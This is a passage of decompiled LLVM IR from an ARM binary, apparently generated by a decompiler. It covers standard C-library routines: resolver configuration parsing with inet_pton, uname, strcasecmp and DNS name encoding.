  %v1_1e9f0 = load i32, i32* @r7, align 4
  %v2_1e9f0 = add i32 %v1_1e9f0, 16
  %v3_1e9f0 = inttoptr i32 %v2_1e9f0 to i32*
  store i32 %v0_1e9f0, i32* %v3_1e9f0, align 4
  %v0_1e9f4 = load i32, i32* @sl, align 4
  %v1_1e9f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e9f4 = add i32 %v1_1e9f4, 24
  %v3_1e9f4 = inttoptr i32 %v2_1e9f4 to i32*
  store i32 %v0_1e9f4, i32* %v3_1e9f4, align 4
  br i1 %v7_1e9e8, label %dec_label_pc_1e9fc, label %dec_label_pc_1ea2c

dec_label_pc_1e9fc:                               ; preds = %dec_label_pc_1e9d0
  %v3_1e9fc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1e9fc, i32* %r3.global-to-local, align 4
  %v0_1ea00 = load i32, i32* @r8, align 4
  %v1_1ea04 = inttoptr i32 %v3_1e9fc to i32*
  %v2_1ea04 = load i32, i32* %v1_1ea04, align 4
  store i32 %v2_1ea04, i32* %r1.global-to-local, align 4
  %v0_1ea08 = load i32, i32* @sl, align 4
  store i32 %v0_1ea08, i32* %r2.global-to-local, align 4
  %v3_1ea0c = inttoptr i32 %v2_1ea04 to i8*
  %v4_1ea0c = call i32 @inet_pton(i32 %v0_1ea00, i8* %v3_1ea0c, i32 %v0_1ea08)
  %tmp23 = icmp slt i32 %v4_1ea0c, 1
  br i1 %tmp23, label %dec_label_pc_1ea6c, label %dec_label_pc_1ea18

dec_label_pc_1ea18:                               ; preds = %dec_label_pc_1e9fc
  %v0_1ea1c = load i32, i32* @r7, align 4
  %v2_1ea1c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1ea1c, i32* %v2_1ea1c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1ea24 = load i32, i32* @r8, align 4
  %v1_1ea24 = load i32, i32* @r7, align 4
  %v2_1ea24 = add i32 %v1_1ea24, 8
  %v3_1ea24 = inttoptr i32 %v2_1ea24 to i32*
  store i32 %v0_1ea24, i32* %v3_1ea24, align 4
  %v0_1ea64.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ea60

dec_label_pc_1ea2c:                               ; preds = %dec_label_pc_1e9d0
  %v0_1ea2c = load i32, i32* @r8, align 4
  %v7_1ea2c = icmp eq i32 %v0_1ea2c, 10
  br i1 %v7_1ea2c, label %dec_label_pc_1ea34, label %dec_label_pc_1ea6c

dec_label_pc_1ea34:                               ; preds = %dec_label_pc_1ea2c
  %v3_1ea34 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1ea34, i32* %r3.global-to-local, align 4
  %v1_1ea3c = inttoptr i32 %v3_1ea34 to i32*
  %v2_1ea3c = load i32, i32* %v1_1ea3c, align 4
  store i32 %v2_1ea3c, i32* %r1.global-to-local, align 4
  %v0_1ea40 = load i32, i32* @sl, align 4
  store i32 %v0_1ea40, i32* %r2.global-to-local, align 4
  %v3_1ea44 = inttoptr i32 %v2_1ea3c to i8*
  %v4_1ea44 = call i32 @inet_pton(i32 10, i8* %v3_1ea44, i32 %v0_1ea40)
  %tmp24 = icmp slt i32 %v4_1ea44, 1
  br i1 %tmp24, label %dec_label_pc_1ea6c, label %dec_label_pc_1ea50

dec_label_pc_1ea50:                               ; preds = %dec_label_pc_1ea34
  store i32 %tmp7, i32* @ip, align 4
  %v0_1ea54 = load i32, i32* @r8, align 4
  %v1_1ea54 = load i32, i32* @r7, align 4
  %v2_1ea54 = add i32 %v1_1ea54, 8
  %v3_1ea54 = inttoptr i32 %v2_1ea54 to i32*
  store i32 %v0_1ea54, i32* %v3_1ea54, align 4
  %v0_1ea58 = load i32, i32* @r7, align 4
  %v1_1ea58 = load i32, i32* @ip, align 4
  %v2_1ea58 = inttoptr i32 %v1_1ea58 to i32*
  store i32 %v0_1ea58, i32* %v2_1ea58, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ea60

dec_label_pc_1ea60:                               ; preds = %dec_label_pc_1ea18, %dec_label_pc_1ea50
  %v0_1ea64 = phi i32 [ %v0_1ea64.pre, %dec_label_pc_1ea18 ], [ 16, %dec_label_pc_1ea50 ]
  store i32 0, i32* @sb, align 4
  %v1_1ea64 = load i32, i32* @r7, align 4
  %v2_1ea64 = add i32 %v1_1ea64, 12
  %v3_1ea64 = inttoptr i32 %v2_1ea64 to i32*
  store i32 %v0_1ea64, i32* %v3_1ea64, align 4
  br label %dec_label_pc_1ea94

dec_label_pc_1ea6c:                               ; preds = %dec_label_pc_1ea2c, %dec_label_pc_1ea34, %dec_label_pc_1e9fc
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1ea70

dec_label_pc_1ea70:                               ; preds = %dec_label_pc_1e9b8.preheader, %dec_label_pc_1e9ac.dec_label_pc_1e9b8_crit_edge, %dec_label_pc_1e994, %dec_label_pc_1ea6c, %dec_label_pc_1e924
  %v0_1ea70 = load i32, i32* @r6, align 4
  store i32 %v2_1e92c, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1e960, i32* %r3.global-to-local, align 4
  %v4_1ea80 = inttoptr i32 %v0_1ea70 to i32*
  %v5_1ea80 = call i32 @__GI_config_read(i32* %v4_1ea80, i32 %v2_1e92c, i32 459270, i32 %v0_1e960)
  %v2_1ea84 = icmp eq i32 %v5_1ea80, 0
  br i1 %v2_1ea84, label %dec_label_pc_1ea8c, label %dec_label_pc_1e974

dec_label_pc_1ea8c:                               ; preds = %dec_label_pc_1ea70
  %v0_1ea8c = load i32, i32* @fp, align 4
  %v7_1ea8c = icmp eq i32 %v0_1ea8c, 1
  br i1 %v7_1ea8c, label %dec_label_pc_1ea9c, label %dec_label_pc_1ea94

dec_label_pc_1ea94:                               ; preds = %dec_label_pc_1ea8c, %dec_label_pc_1ea60
  %v0_1ea94 = load i32, i32* @r6, align 4
  %v1_1ea98 = inttoptr i32 %v0_1ea94 to i32*
  %v2_1ea98 = call i32 @__GI_config_close(i32* %v1_1ea98)
  br label %dec_label_pc_1ea9c

dec_label_pc_1ea9c:                               ; preds = %dec_label_pc_1e974, %.thread, %dec_label_pc_1ea8c, %dec_label_pc_1e910, %dec_label_pc_1ea94
  %v0_1ea9c = load i32, i32* @sb, align 4
  store i32 %v3_1e8b4, i32* @r4, align 4
  store i32 %v6_1e8b4, i32* @r5, align 4
  store i32 %v9_1e8b4, i32* @r6, align 4
  store i32 %v12_1e8b4, i32* @r7, align 4
  store i32 %v15_1e8b4, i32* @r8, align 4
  store i32 %v18_1e8b4, i32* @sb, align 4
  store i32 %v21_1e8b4, i32* @sl, align 4
  store i32 %v24_1e8b4, i32* @fp, align 4
  ret i32 %v0_1ea9c

; uselistorder directives
  uselistorder i32 %v2_1e9b8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1e9b8.pre, { 1, 0 }
  uselistorder i32 %v0_1e960, { 1, 0 }
  uselistorder i32 %v2_1e92c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 37, 39, 40, 12, 44, 47, 48, 49, 31, 32, 14, 13, 4, 51, 50, 41, 15, 52, 16, 53, 17, 54, 55, 1, 45, 46, 56, 18, 57, 19, 20, 21, 38, 8, 0, 42, 43, 22, 61, 58, 59, 23, 60, 25, 24, 33, 34, 7, 11, 10, 6, 9, 2, 35, 36, 26, 5, 28, 29, 27, 30, 62 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 33 }
  uselistorder i32 24, { 28, 32, 34, 35, 0, 46, 47, 36, 37, 13, 14, 15, 16, 38, 39, 33, 48, 1, 43, 40, 41, 42, 29, 30, 49, 44, 11, 31, 17, 18, 19, 4, 12, 2, 50, 51, 52, 53, 54, 55, 56, 57, 20, 45, 21, 22, 23, 24, 25, 26, 8, 9, 7, 10, 3, 5, 6, 27 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 4, 23, 13, 5, 20, 21, 14, 15, 16, 17, 1, 22, 24, 6, 25, 26, 2, 7, 27, 8, 28, 9, 30, 31, 32, 29, 18, 0, 10, 19, 11, 12, 3 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 12, 4, 13, 11, 1, 6 }
  uselistorder i32* @fp, { 58, 59, 60, 61, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 0, 84, 94, 2, 95, 96, 97, 98, 99, 100, 101, 102, 5, 6, 80, 81, 82, 83, 103, 104, 105, 1, 106, 107, 108, 109, 110, 85, 86, 87, 88, 89, 90, 91, 92, 93, 62, 63, 64, 65, 66, 67, 68, 69, 3, 138, 140, 139, 141, 124, 125, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 142, 143, 144, 145, 146, 147, 154, 153, 148, 149, 150, 151, 152, 4 }
  uselistorder i32* @sl, { 17, 18, 19, 20, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 42, 43, 5, 44, 45, 46, 0, 47, 1, 48, 49, 50, 51, 52, 53, 54, 55, 56, 9, 10, 36, 37, 38, 39, 40, 41, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 21, 22, 23, 24, 25, 6, 7, 11, 12, 85, 86, 87, 2, 88, 89, 90, 91, 92, 93, 95, 3, 94, 97, 96, 98, 99, 100, 101, 81, 82, 83, 84, 67, 68, 69, 70, 71, 72, 73, 4, 74, 75, 76, 77, 78, 79, 80, 13, 14, 15, 16, 8 }
  uselistorder i32* @sb, { 8, 9, 10, 11, 16, 17, 18, 19, 20, 21, 34, 22, 23, 24, 2, 25, 62, 63, 3, 64, 65, 66, 67, 68, 69, 70, 5, 6, 7, 26, 27, 28, 29, 30, 31, 32, 33, 71, 72, 73, 74, 75, 76, 77, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 12, 13, 14, 15, 88, 91, 89, 90, 92, 86, 87, 78, 79, 80, 81, 82, 83, 84, 0, 85, 4 }
  uselistorder i32* @r8, { 27, 28, 29, 30, 31, 32, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 56, 59, 6, 60, 61, 62, 63, 64, 2, 65, 66, 67, 68, 69, 70, 15, 16, 17, 51, 52, 3, 53, 54, 55, 71, 72, 73, 74, 75, 76, 77, 78, 79, 57, 58, 48, 49, 33, 34, 35, 36, 18, 19, 20, 9, 10, 4, 11, 107, 94, 95, 96, 97, 98, 5, 99, 100, 101, 102, 103, 104, 105, 106, 7, 8, 92, 93, 80, 81, 82, 83, 84, 85, 1, 86, 0, 87, 88, 89, 12, 13, 90, 91, 21, 22, 23, 24, 25, 26, 14 }
  uselistorder label %dec_label_pc_1ea9c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1ea70, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1ea6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1ea60, { 1, 0 }
  uselistorder label %dec_label_pc_1e9ac, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1eab8 = load i32, i32* @r7, align 4
  store i32 %v3_1eab8, i32* %stack_var_-8, align 4
  %v0_1eac4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1eac4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1eac4, -4095
  br i1 %tmp, label %dec_label_pc_1eae4, label %dec_label_pc_1ead4

dec_label_pc_1ead4:                               ; preds = %entry
  %v0_1ead4 = call i32 @__GI___errno_location()
  %v0_1ead8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ead8 = sub i32 0, %v0_1ead8
  %v2_1eadc = inttoptr i32 %v0_1ead4 to i32*
  store i32 %v1_1ead8, i32* %v2_1eadc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1eae4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1eae4

dec_label_pc_1eae4:                               ; preds = %entry, %dec_label_pc_1ead4
  %v1_1eae8 = phi i32 [ %v0_1eac4, %entry ], [ -1, %dec_label_pc_1ead4 ]
  %v2_1eae4 = phi i32 [ %v3_1eab8, %entry ], [ %v2_1eae4.pre, %dec_label_pc_1ead4 ]
  store i32 %v2_1eae4, i32* @r7, align 4
  ret i32 %v1_1eae8

; uselistorder directives
  uselistorder i32 %v0_1eac4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 52, 51, 49, 48, 47, 46, 45, 86, 85, 84, 34, 40, 33, 32, 83, 82, 42, 79, 41, 50, 31, 30, 38, 37, 29, 81, 80, 78, 77, 76, 75, 5, 59, 17, 9, 74, 8, 22, 7, 16, 15, 14, 44, 43, 73, 72, 71, 13, 12, 58, 21, 35, 60, 57, 11, 25, 54, 64, 36, 28, 27, 26, 70, 6, 2, 4, 39, 68, 10, 69, 0, 56, 3, 23, 67, 24, 65, 55, 66, 19, 1, 18, 63, 62, 61, 87, 53, 20 }
  uselistorder i32* @r7, { 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 121, 122, 123, 124, 125, 126, 127, 128, 135, 136, 137, 138, 139, 150, 151, 152, 153, 154, 155, 156, 157, 162, 163, 164, 165, 166, 21, 22, 23, 24, 1, 25, 3, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 5, 178, 179, 180, 26, 27, 28, 29, 30, 31, 32, 33, 129, 130, 131, 132, 133, 134, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 6, 140, 146, 141, 7, 142, 143, 144, 14, 145, 147, 8, 148, 149, 193, 2, 194, 197, 198, 199, 9, 195, 196, 118, 119, 120, 90, 10, 91, 92, 93, 94, 95, 96, 34, 35, 40, 41, 42, 43, 36, 37, 38, 39, 44, 45, 46, 47, 265, 266, 68, 69, 235, 236, 226, 227, 48, 228, 224, 225, 267, 268, 269, 270, 275, 276, 11, 16, 17, 49, 50, 4, 51, 15, 52, 53, 237, 238, 243, 244, 245, 246, 247, 248, 249, 239, 240, 241, 242, 250, 251, 252, 253, 254, 255, 256, 257, 12, 258, 259, 260, 160, 161, 261, 262, 220, 221, 60, 61, 158, 159, 217, 13, 218, 219, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 214, 215, 18, 19, 210, 211, 212, 213, 216, 0, 70, 71, 72, 73, 229, 230, 273, 274, 54, 55, 263, 264, 74, 75, 271, 272, 222, 223, 56, 57, 58, 59, 76, 77, 231, 232, 233, 234, 62, 63, 64, 65, 66, 67, 20 }
  uselistorder label %dec_label_pc_1eae4, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_1eb08

dec_label_pc_1eb08:                               ; preds = %dec_label_pc_1eb34, %entry
  %v1_1eb4c8 = phi i32 [ %v1_1eb4c9, %dec_label_pc_1eb34 ], [ 0, %entry ]
  %v0_1eb3c = phi i32 [ %v1_1eb3c, %dec_label_pc_1eb34 ], [ %arg2, %entry ]
  %v0_1eb40 = phi i32 [ %v1_1eb40, %dec_label_pc_1eb34 ], [ %tmp, %entry ]
  %v9_1eb08 = icmp eq i32 %v0_1eb40, %v0_1eb3c
  %.pre = inttoptr i32 %v0_1eb40 to i8*
  br i1 %v9_1eb08, label %dec_label_pc_1eb34, label %dec_label_pc_1eb10

dec_label_pc_1eb10:                               ; preds = %dec_label_pc_1eb08
  %v2_1eb10 = load i8, i8* %.pre, align 1
  %v3_1eb10 = zext i8 %v2_1eb10 to i32
  %v1_1eb14 = inttoptr i32 %v0_1eb3c to i8*
  %v2_1eb14 = load i8, i8* %v1_1eb14, align 1
  %v3_1eb14 = zext i8 %v2_1eb14 to i32
  %v4_1eb18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 1124) to i32*), align 4
  %v2_1eb1c = mul nuw nsw i32 %v3_1eb14, 2
  %v2_1eb20 = mul nuw nsw i32 %v3_1eb10, 2
  %v2_1eb24 = add i32 %v4_1eb18, %v2_1eb1c
  %v3_1eb24 = inttoptr i32 %v2_1eb24 to i16*
  %v4_1eb24 = load i16, i16* %v3_1eb24, align 2
  %v6_1eb24 = sext i16 %v4_1eb24 to i32
  %v2_1eb28 = add i32 %v4_1eb18, %v2_1eb20
  %v3_1eb28 = inttoptr i32 %v2_1eb28 to i16*
  %v4_1eb28 = load i16, i16* %v3_1eb28, align 2
  %v6_1eb28 = sext i16 %v4_1eb28 to i32
  %v2_1eb2c = sub nsw i32 %v6_1eb28, %v6_1eb24
  %v9_1eb2c = icmp eq i16 %v4_1eb28, %v4_1eb24
  br i1 %v9_1eb2c, label %dec_label_pc_1eb34, label %dec_label_pc_1eb48

dec_label_pc_1eb34:                               ; preds = %dec_label_pc_1eb08, %dec_label_pc_1eb10
  %v1_1eb4c9 = phi i32 [ %v2_1eb2c, %dec_label_pc_1eb10 ], [ %v1_1eb4c8, %dec_label_pc_1eb08 ]
  %v2_1eb34 = load i8, i8* %.pre, align 1
  %v2_1eb38 = icmp eq i8 %v2_1eb34, 0
  %v1_1eb3c = add i32 %v0_1eb3c, 1
  %v1_1eb40 = add i32 %v0_1eb40, 1
  store i32 %v1_1eb40, i32* @ip, align 4
  br i1 %v2_1eb38, label %dec_label_pc_1eb48, label %dec_label_pc_1eb08

dec_label_pc_1eb48:                               ; preds = %dec_label_pc_1eb34, %dec_label_pc_1eb10
  %v1_1eb4c = phi i32 [ %v1_1eb4c9, %dec_label_pc_1eb34 ], [ %v2_1eb2c, %dec_label_pc_1eb10 ]
  ret i32 %v1_1eb4c

; uselistorder directives
  uselistorder i32 %v1_1eb40, { 1, 0 }
  uselistorder i32 %v2_1eb2c, { 1, 0 }
  uselistorder i32 %v0_1eb40, { 1, 0, 2 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 ptrtoint (i16* @global_var_2c158.876 to i32), { 97, 23, 24, 25, 96, 3, 4, 26, 95, 1, 94, 93, 92, 91, 90, 89, 88, 27, 28, 87, 86, 85, 22, 29, 84, 83, 82, 81, 80, 79, 78, 31, 77, 76, 75, 5, 32, 74, 73, 6, 7, 72, 8, 33, 71, 9, 70, 10, 69, 34, 68, 35, 67, 11, 12, 66, 37, 65, 64, 63, 62, 38, 61, 39, 60, 36, 40, 59, 2, 42, 41, 43, 14, 13, 58, 15, 16, 17, 18, 57, 44, 19, 56, 46, 45, 20, 55, 30, 47, 54, 48, 53, 21, 52, 49, 51, 0, 50 }
  uselistorder label %dec_label_pc_1eb34, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1eb58 = load i32, i32* @r4, align 4
  store i32 %v3_1eb58, i32* %stack_var_-32, align 4
  %v6_1eb58 = load i32, i32* @r5, align 4
  %v9_1eb58 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1eb60 = load i32, i32* @r1, align 4
  store i32 %v0_1eb60, i32* %r8.global-to-local, align 4
  %v0_1eb64 = load i32, i32* @r2, align 4
  store i32 %v0_1eb64, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebcc23 = icmp slt i8* %arg1, null
  store i1 %v1_1ebcc23, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebcc24 = icmp eq i8* %arg1, null
  store i1 %v2_1ebcc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ebcc24, label %dec_label_pc_1ebe4, label %dec_label_pc_1ebd8

dec_label_pc_1eb70:                               ; preds = %dec_label_pc_1ebd8
  %v2_1eb70 = call i32 @__GI_strchr(i32 %v0_1eb7026, i32 46)
  store i32 %v2_1eb70, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1eb74 = icmp slt i32 %v2_1eb70, 0
  store i1 %v1_1eb74, i1* %cpsr_n.global-to-local, align 1
  %v2_1eb74 = icmp eq i32 %v2_1eb70, 0
  store i1 %v2_1eb74, i1* %cpsr_z.global-to-local, align 1
  %v0_1eb78 = load i32, i32* @r4, align 4
  %v2_1eb78 = sub i32 %v2_1eb70, %v0_1eb78
  store i32 %v2_1eb78, i32* @r5, align 4
  br i1 %v2_1eb74, label %dec_label_pc_1eb80, label %dec_label_pc_1eb8c

dec_label_pc_1eb80:                               ; preds = %dec_label_pc_1eb70
  %v1_1eb80 = inttoptr i32 %v0_1eb78 to i8*
  %v3_1eb84 = call i32 @strlen(i8* %v1_1eb80)
  %sext = mul i32 %v3_1eb84, 16777216
  %v1_1eb88 = sdiv i32 %sext, 16777216
  store i32 %v1_1eb88, i32* @r5, align 4
  %v0_1eb98.pre = load i32, i32* @r4, align 4
  %v0_1eba8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1eb8c

dec_label_pc_1eb8c:                               ; preds = %dec_label_pc_1eb70, %dec_label_pc_1eb80
  %v0_1eba8 = phi i32 [ %v2_1eb70, %dec_label_pc_1eb70 ], [ %v0_1eba8.pre, %dec_label_pc_1eb80 ]
  %v0_1eb98 = phi i32 [ %v0_1eb78, %dec_label_pc_1eb70 ], [ %v0_1eb98.pre, %dec_label_pc_1eb80 ]
  %v0_1ebb8 = phi i32 [ %v2_1eb78, %dec_label_pc_1eb70 ], [ %v1_1eb88, %dec_label_pc_1eb80 ]
  %v0_1eb8c = load i32, i32* %sl.global-to-local, align 4
  %v1_1eb8c = add i32 %v0_1eb8c, 1
  store i32 %v1_1eb8c, i32* %r7.global-to-local, align 4
  %v1_1eb90 = load i32, i32* %sb.global-to-local, align 4
  %v2_1eb90 = sub i32 %v1_1eb90, %v0_1eb8c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1eb94 = icmp slt i32 %v0_1ebb8, 0
  store i1 %v1_1eb94, i1* %cpsr_n.global-to-local, align 1
  %v2_1eb94 = icmp eq i32 %v0_1ebb8, 0
  store i1 %v2_1eb94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1eb98, i32* @r1, align 4
  %v0_1eb9c = load i32, i32* %r8.global-to-local, align 4
  %v2_1eb9c = add i32 %v0_1eb9c, %v1_1eb8c
  store i32 %v2_1eb9c, i32* @r0, align 4
  store i32 %v0_1ebb8, i32* @r2, align 4
  %v1_1eba4 = add i32 %v2_1eb90, -1
  store i32 %v1_1eba4, i32* @r3, align 4
  %v1_1eba8 = add i32 %v0_1eba8, 1
  store i32 %v1_1eba8, i32* @r4, align 4
  br i1 %v2_1eb94, label %dec_label_pc_1ebf8, label %dec_label_pc_1ebb0

dec_label_pc_1ebb0:                               ; preds = %dec_label_pc_1eb8c
  %v2_1ebb0 = sub i32 %v0_1ebb8, %v1_1eba4
  %v3_1ebb0 = icmp ult i32 %v0_1ebb8, %v1_1eba4
  %v4_1ebb0 = xor i32 %v1_1eba4, %v0_1ebb8
  %v5_1ebb0 = xor i32 %v2_1ebb0, %v0_1ebb8
  %v6_1ebb0 = and i32 %v5_1ebb0, %v4_1ebb0
  %v7_1ebb0 = icmp slt i32 %v6_1ebb0, 0
  store i1 %v7_1ebb0, i1* %cpsr_v.global-to-local, align 1
  %v8_1ebb0 = icmp slt i32 %v2_1ebb0, 0
  store i1 %v8_1ebb0, i1* %cpsr_n.global-to-local, align 1
  %v9_1ebb0 = icmp eq i32 %v0_1ebb8, %v1_1eba4
  store i1 %v9_1ebb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1ebb0, label %dec_label_pc_1ebb8, label %dec_label_pc_1ebf8

dec_label_pc_1ebb8:                               ; preds = %dec_label_pc_1ebb0
  %v1_1ebb8 = trunc i32 %v0_1ebb8 to i8
  %v4_1ebb8 = add i32 %v0_1eb9c, %v0_1eb8c
  %v5_1ebb8 = inttoptr i32 %v4_1ebb8 to i8*
  store i8 %v1_1ebb8, i8* %v5_1ebb8, align 1
  %v0_1ebbc = call i32 @memcpy()
  store i32 %v0_1ebbc, i32* @r0, align 4
  %v0_1ebc0 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebc0 = icmp slt i32 %v0_1ebc0, 0
  store i1 %v1_1ebc0, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebc0 = icmp eq i32 %v0_1ebc0, 0
  store i1 %v2_1ebc0, i1* %cpsr_z.global-to-local, align 1
  %v0_1ebc4 = load i32, i32* @r5, align 4
  %v1_1ebc4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1ebc4 = add i32 %v1_1ebc4, %v0_1ebc4
  store i32 %v2_1ebc4, i32* %sl.global-to-local, align 4
  br i1 %v2_1ebc0, label %dec_label_pc_1ebe4, label %dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge

dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge:  ; preds = %dec_label_pc_1ebb8
  %v0_1ebcc.pre = load i32, i32* @r4, align 4
  store i32 %v0_1ebcc.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebcc = icmp slt i32 %v0_1ebcc.pre, 0
  store i1 %v1_1ebcc, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebcc = icmp eq i32 %v0_1ebcc.pre, 0
  store i1 %v2_1ebcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ebcc, label %dec_label_pc_1ebe4, label %dec_label_pc_1ebd8

dec_label_pc_1ebd8:                               ; preds = %entry, %dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge
  %v0_1eb7026 = phi i32 [ %v0_1ebcc.pre, %dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge ], [ %tmp, %entry ]
  %v5_1ebec525 = phi i32 [ %v2_1ebc4, %dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge ], [ 0, %entry ]
  %v1_1ebd8 = inttoptr i32 %v0_1eb7026 to i8*
  %v2_1ebd8 = load i8, i8* %v1_1ebd8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebdc = icmp eq i8 %v2_1ebd8, 0
  store i1 %v2_1ebdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ebdc, label %dec_label_pc_1ebe4, label %dec_label_pc_1eb70

dec_label_pc_1ebe4:                               ; preds = %dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge, %dec_label_pc_1ebb8, %dec_label_pc_1ebd8, %entry
  %v8_1ebf0 = phi i32 [ 0, %entry ], [ %v5_1ebec525, %dec_label_pc_1ebd8 ], [ %v2_1ebc4, %dec_label_pc_1ebb8 ], [ %v2_1ebc4, %dec_label_pc_1ebb8.dec_label_pc_1ebcc_crit_edge ]
  %v0_1ebe4 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebe4 = icmp slt i32 %v0_1ebe4, 0
  store i1 %v1_1ebe4, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebe4 = icmp eq i32 %v0_1ebe4, 0
  store i1 %v2_1ebe4, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1ebe4, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1ebe4
  %v6_1ebec = add i32 %v8_1ebf0, 1
  store i32 %v6_1ebec, i32* @r0, align 4
